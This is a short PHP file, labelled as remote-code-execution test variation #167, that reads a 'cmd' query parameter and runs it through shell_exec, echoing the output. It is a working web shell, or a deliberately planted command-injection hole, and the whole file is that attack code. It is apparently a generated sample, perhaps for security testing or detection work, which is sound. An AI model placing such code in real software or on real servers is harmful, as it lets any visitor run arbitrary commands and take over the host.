<?php
// RCE test variation #167
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>